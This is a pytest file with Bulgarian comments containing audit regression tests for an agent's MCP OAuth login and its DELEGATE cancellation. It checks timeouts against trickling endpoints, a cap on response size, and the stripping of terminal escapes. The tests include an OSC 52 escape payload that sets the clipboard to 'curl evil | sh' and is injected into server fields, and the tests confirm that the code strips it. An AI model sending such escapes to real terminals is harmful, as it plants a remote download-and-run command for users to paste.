"""Одит 2026-11-04 (шести кръг, 3/3): `/mcp login` (mcp_oauth) и DELEGATE.
Всеки тест падаше срещу кода преди поправката (възпроизведено със
скриптовете на одита: фалшив сървър за вход на 127.0.0.1 и мисия с бавен
фалшив модел)."""
from __future__ import annotations

import json
import os
import signal
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace
from typing import ClassVar
from urllib.parse import parse_qs, urlsplit

import pytest

import genesis_skills as gs
from genesis_agent import autonomous_loop as al
from genesis_agent import delegate as dm
from genesis_agent import mcp_oauth
from genesis_agent.brain import Brain as _RealBrain
from genesis_agent.storage_monitor import StorageReport

# ── сървър за вход, който прави каквото тестът каже ─────────────────────────


@pytest.fixture
def server(monkeypatch):
    """`handlers[(метод, път)] = fn(h)`; `stop` прекратява капещите отговори,
    за да не остане нищо да виси след теста."""
    monkeypatch.setenv("NO_PROXY", "127.0.0.1,localhost")
    monkeypatch.setenv("no_proxy", "127.0.0.1,localhost")
    handlers: dict = {}
    stop = threading.Event()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _go(self, method):
            if method == "POST":
                self.rfile.read(int(self.headers.get("Content-Length") or 0))
            fn = handlers.get((method, urlsplit(self.path).path))
            if fn is None:
                return send(self, 404, {})
            return fn(self)

        def do_GET(self):
            self._go("GET")

        def do_POST(self):
            self._go("POST")

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"
    yield SimpleNamespace(base=base, handlers=handlers, stop=stop)
    stop.set()
    httpd.shutdown()
    httpd.server_close()


def send(h, status: int, obj, extra: dict | None = None) -> None:
    body = json.dumps(obj).encode()
    h.send_response(status)
    h.send_header("Content-Type", "application/json")
    for k, v in (extra or {}).items():
        h.send_header(k, v)
    h.send_header("Content-Length", str(len(body)))
    h.end_headers()
    h.wfile.write(body)


def trickle(stop: threading.Event):
    """Отговор 200, който капе по байт — никога не стига Content-Length."""
    def fn(h) -> None:
        h.send_response(200)
        h.send_header("Content-Type", "application/json")
        h.send_header("Content-Length", "100000")
        h.end_headers()
        try:
            while not stop.is_set():
                h.wfile.write(b" ")
                h.wfile.flush()
                time.sleep(0.2)
        except OSError:
            pass
    return fn


def _expired_entry(srv_url: str, token_endpoint: str, issuer: str) -> None:
    with mcp_oauth._FileLock():
        mcp_oauth._save(srv_url, {
            "access_token": "old", "refresh_token": "r1", "expires_at": time.time() - 10,
            "lifetime": 3600, "client_id": "c", "token_endpoint": token_endpoint,
            "resource": srv_url, "issuer": issuer})


# ── 1. Сървър за вход, който капе: подновяването висеше без край под ключалката ──

def test_a_trickling_token_endpoint_does_not_hold_every_refresh(server, monkeypatch) -> None:
    """Измерено: refresh() срещу /token, който праща по байт на 0.5 s, още
    висеше след 40 s (timeout=15 на requests е за едно recv) — под _FileLock,
    тоест и подновяването на ЗДРАВ сървър в същия процес чакаше зад него."""
    monkeypatch.setattr(mcp_oauth, "_HTTP_DEADLINE", 2.0, raising=False)
    server.handlers[("POST", "/slow-token")] = trickle(server.stop)
    server.handlers[("POST", "/good-token")] = lambda h: send(
        h, 200, {"access_token": "fresh", "expires_in": 3600})
    slow, good = server.base + "/slow/mcp", server.base + "/good/mcp"
    _expired_entry(slow, server.base + "/slow-token", server.base)
    _expired_entry(good, server.base + "/good-token", server.base)
    got: dict = {}

    def run(name: str, url: str) -> None:
        t0 = time.monotonic()
        got[name] = (mcp_oauth.access_token(url), time.monotonic() - t0)
    a = threading.Thread(target=run, args=("slow", slow), daemon=True)
    a.start()
    time.sleep(0.3)
    b = threading.Thread(target=run, args=("good", good), daemon=True)
    b.start()
    end = time.monotonic() + 8
    for t in (a, b):
        t.join(max(0.0, end - time.monotonic()))
    server.stop.set()                         # и преди поправката: да се освободи ключалката
    assert "slow" in got and "good" in got, f"подновяването още виси: {got}"
    assert got["slow"][0] == "" and got["slow"][1] < 6
    assert got["good"][0] == "fresh" and got["good"][1] < 6
    a.join(10)
    assert not mcp_oauth._lock.locked()


def test_a_trickling_metadata_endpoint_does_not_hang_the_login(server, monkeypatch) -> None:
    monkeypatch.setattr(mcp_oauth, "_HTTP_DEADLINE", 2.0, raising=False)
    server.handlers[("GET", "/.well-known/oauth-protected-resource/mcp")] = trickle(server.stop)
    box: list = []

    def run() -> None:
        try:
            mcp_oauth.discover(server.base + "/mcp")
        except mcp_oauth.OAuthError as e:
            box.append(e)
    t = threading.Thread(target=run, daemon=True)
    t0 = time.monotonic()
    t.start()
    t.join(10)
    server.stop.set()
    assert box and time.monotonic() - t0 < 8, "откриването още виси"


def test_a_huge_token_response_is_refused_not_read_into_memory(server, monkeypatch) -> None:
    """Измерено: 200 MB отговор от /token → 431 MB RSS и токенът приет.
    Тук таванът е смален, за да е бърз тестът; 2 MB над него се отказват."""
    monkeypatch.setattr(mcp_oauth, "_MAX_BODY", 64 * 1024, raising=False)

    def huge(h) -> None:
        body = b" " * (2 * 1024 * 1024) + json.dumps({"access_token": "big"}).encode()
        h.send_response(200)
        h.send_header("Content-Type", "application/json")
        h.send_header("Content-Length", str(len(body)))
        h.end_headers()
        try:
            h.wfile.write(body)
        except OSError:
            pass
    server.handlers[("POST", "/token")] = huge
    srv = server.base + "/mcp"
    _expired_entry(srv, server.base + "/token", server.base)
    assert mcp_oauth.refresh(srv, stale="old") is None


# ── 2. Управляващи знаци от сървъра за вход стигаха до терминала ────────────

_OSC52 = "\x1b]52;c;Y3VybCBldmlsIHwgc2gK\x1b\\"      # клипбордът := „curl evil | sh“


def test_control_characters_in_the_login_address_are_refused(server) -> None:
    """Измерено през `/mcp login`: OSC 52 (запис в клипборда) и „изчисти
    екрана“ от authorization_endpoint стигаха до терминала непокътнати (Rich
    с markup=False пропуска ESC), а адресът — и до браузъра."""
    b = server.base
    server.handlers[("GET", "/.well-known/oauth-protected-resource/mcp")] = lambda h: send(
        h, 200, {"resource": b + "/mcp", "authorization_servers": [b]})
    server.handlers[("GET", "/.well-known/oauth-authorization-server")] = lambda h: send(
        h, 200, {"issuer": b, "authorization_endpoint": b + "/authorize" + _OSC52 + "\x1b[2J",
                 "token_endpoint": b + "/token", "registration_endpoint": b + "/register"})
    server.handlers[("POST", "/register")] = lambda h: send(h, 201, {"client_id": "c1"})
    said: list[str] = []
    opened: list[str] = []
    with pytest.raises(mcp_oauth.OAuthError):
        mcp_oauth.login(b + "/mcp", open_browser=opened.append, say=said.append, timeout=1)
    assert not any("\x1b" in s for s in said + opened), said


def test_the_servers_error_text_comes_without_escapes(server) -> None:
    server.handlers[("POST", "/token")] = lambda h: send(
        h, 400, {"error": "invalid_grant", "error_description": "bad" + _OSC52 + "\x1b[2J"})
    with pytest.raises(mcp_oauth.OAuthError) as e:
        mcp_oauth._token_request(server.base + "/token", {"grant_type": "x"})
    assert "\x1b" not in str(e.value) and "bad" in str(e.value)


def test_a_refused_login_reason_comes_without_escapes(server) -> None:
    b = server.base
    server.handlers[("GET", "/.well-known/oauth-protected-resource/mcp")] = lambda h: send(
        h, 200, {"resource": b + "/mcp", "authorization_servers": [b]})
    server.handlers[("GET", "/.well-known/oauth-authorization-server")] = lambda h: send(
        h, 200, {"issuer": b, "authorization_endpoint": b + "/authorize",
                 "token_endpoint": b + "/token", "registration_endpoint": b + "/register"})
    server.handlers[("POST", "/register")] = lambda h: send(h, 201, {"client_id": "c1"})
    said: list[str] = []

    def paste(_q: str) -> str:
        auth = next(s for s in said if "/authorize?" in s).split("\n")[-1]
        state = parse_qs(urlsplit(auth).query)["state"][0]
        return (f"http://127.0.0.1:1/callback?error=access_denied&state={state}"
                "&error_description=%1B%5D52%3Bc%3BY3VybA%3D%3D%1B%5C%1B%5B2Jno")
    with pytest.raises(mcp_oauth.OAuthError) as e:
        mcp_oauth.login(b + "/mcp", say=said.append, paste=paste, timeout=1)
    assert "\x1b" not in str(e.value) and "отказан" in str(e.value)


# ── 3. DELEGATE: Ctrl-C и „Стоп“ не спираха мисията ──────────────────────────

class _SlowBrain:
    """Мисия, която мисли бавно и никога не дава код: всяко обръщение е рунд."""
    trim_round_history = staticmethod(_RealBrain.trim_round_history)
    local = None
    chain: ClassVar[list[dict]] = [{"provider": "fake", "model": "fake"}]
    current = None
    calls: ClassVar[list[float]] = []

    def __init__(self, *a, **kw) -> None:
        pass

    def route_for_goal(self, goal: str) -> None:
        pass

    def build_context(self, goal: str) -> str:
        return ""

    def system_prompt_base(self) -> str:
        return "sys"

    def escalate(self) -> bool:
        return True

    def generate_local_candidates(self, messages, n=2):
        return []

    def complete(self, messages, tools=None, avoid=None):
        _SlowBrain.calls.append(time.monotonic())
        time.sleep(0.25)                                  # обръщение към модела
        return SimpleNamespace(raw_text="още мисля", code=None, tool_calls=None, usage=None)


@pytest.fixture
def mission(monkeypatch, tmp_path):
    _SlowBrain.calls = []
    saved: list = []
    monkeypatch.setattr(al, "Brain", _SlowBrain)
    monkeypatch.setattr(al, "MAX_LLM_RETRIES", 20)        # 20 × 0.25 s = 5 s мисия
    monkeypatch.setattr(al, "save_skill", lambda **kw: saved.append(kw))
    monkeypatch.setattr(al, "check_storage", lambda: StorageReport(
        total_bytes=0, threshold_bytes=1, compression_required=False,
        log_path=None, candidates_path=None))
    monkeypatch.setattr("genesis_agent.telemetry.STATUS_FILE", str(tmp_path / "status.json"))
    monkeypatch.setattr("genesis_agent.reflection.lessons_for_prompt", lambda *a, **k: "")
    monkeypatch.setattr("genesis_agent.reflection.record_mission", lambda *a, **k: None)
    monkeypatch.setattr("genesis_agent.notifier.notify", lambda *a, **k: None)
    dm._TASKS.clear()
    yield saved
    for task in list(dm._TASKS.values()):                 # нищо да не тече след теста
        if hasattr(task, "cancel"):
            task.cancel.set()
        if task.thread:
            task.thread.join(10)
    dm._TASKS.clear()


def _calls_after(moment: float) -> int:
    return sum(1 for t in _SlowBrain.calls if t > moment)


def test_ctrl_c_in_delegate_returns_at_once_and_stops_the_mission(mission) -> None:
    """Ctrl-C, който не буди чакането (така е на Windows до 3.14):
    _thread.interrupt_main. Измерено: чатът стоеше до края на мисията
    (wait_all → join(600) — до 10 мин)."""
    import _thread
    threading.Timer(0.3, _thread.interrupt_main).start()
    t0 = time.monotonic()
    with pytest.raises(KeyboardInterrupt):
        gs.dispatch_tool_call("DELEGATE", {"goal": "напиши сортиране"})
    took = time.monotonic() - t0
    assert took < 2.5, f"Ctrl-C чака мисията ({took:.1f} s)"
    stopped_at = time.monotonic()
    time.sleep(1.0)
    assert _calls_after(stopped_at) <= 1, "мисията продължава след Ctrl-C"
    assert mission == []


@pytest.mark.skipif(sys.platform == "win32", reason="истински SIGINT към себе си — POSIX")
def test_a_real_ctrl_c_stops_the_delegated_mission(mission) -> None:
    """Измерено (Linux): KeyboardInterrupt идваше веднага, но мисията във
    фоновата нишка продължаваше — 7 нови обръщения към модела за 2 s (платени),
    с изпълнение на кода и запис на умение, след „⏹ Прекъснато“."""
    threading.Timer(0.3, os.kill, args=(os.getpid(), signal.SIGINT)).start()
    with pytest.raises(KeyboardInterrupt):
        gs.dispatch_tool_call("DELEGATE", {"goal": "напиши сортиране"})
    stopped_at = time.monotonic()
    time.sleep(1.0)
    assert _calls_after(stopped_at) <= 1, "мисията продължава след Ctrl-C"


def test_the_phone_stop_ends_delegate_and_its_mission(mission) -> None:
    """„Стоп“ на телефона (genesis_skills._CANCEL) се гледаше само преди
    DELEGATE — измерено: мисията изкара всичките си рундове (до 600 s)."""
    stop = threading.Event()
    gs._set_cancel(stop.is_set)
    try:
        threading.Timer(0.3, stop.set).start()
        t0 = time.monotonic()
        out = gs.dispatch_tool_call("DELEGATE", {"goal": "напиши сортиране"})
        took = time.monotonic() - t0
    finally:
        gs._set_cancel(None)
    assert took < 2.5, f"„Стоп“ чака мисията ({took:.1f} s)"
    assert "cancelled" in out and "Спряно" in out, out
    stopped_at = time.monotonic()
    time.sleep(1.0)
    assert _calls_after(stopped_at) <= 1, "мисията продължава след „Стоп“"


def test_a_finished_task_keeps_its_cancelled_status(monkeypatch) -> None:
    """Спряна задача, която после свърши, остава „cancelled“ (както
    „timeout“ от одита 2026-10-07) — викащият вече е получил този отговор."""
    release = threading.Event()
    monkeypatch.setattr(dm, "_run_shell", lambda goal, timeout=None: release.wait(5) and "късно")
    task = dm.delegate_task("x", agent="shell")
    flag = threading.Event()
    threading.Timer(0.2, flag.set).start()
    dm.wait_all([task], timeout=5, cancelled=flag.is_set)
    assert task.status == dm.TaskStatus.CANCELLED and task.cancel.is_set()
    release.set()
    task.thread.join(5)
    assert task.status == dm.TaskStatus.CANCELLED
